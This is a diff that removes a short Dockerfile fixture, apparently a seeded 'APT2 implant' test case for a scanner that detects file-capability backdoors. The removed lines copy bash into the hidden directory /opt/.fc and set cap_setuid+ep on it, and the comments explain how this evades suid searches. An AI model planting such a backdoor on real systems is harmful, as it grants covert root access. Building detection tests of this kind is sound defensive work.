@@ -1,9 +1,0 @@
-# APT2 implant: apt2-filecap-setuid (file capability privesc, no suid bit)
-# A 0755 copy of bash under /opt with cap_setuid+ep -- invisible to
-# find -perm -4000 and the mode-only suid walk. -> file_capability_set +
-# file_cap_privileged + non_package_path -> file_capability_outside_package.
-# Needs setcap (libcap2-bin / libcap); inert if absent. Variables: ${bin}
-RUN mkdir -p /opt/.fc && cp /bin/bash ${bin} && \
-    chown root:root ${bin} && chmod 0755 ${bin} && \
-    if command -v setcap >/dev/null 2>&1; then setcap cap_setuid+ep ${bin}; \
-    else echo "apt2-filecap-setuid: setcap unavailable (need libcap2-bin) -- inert" >&2; fi
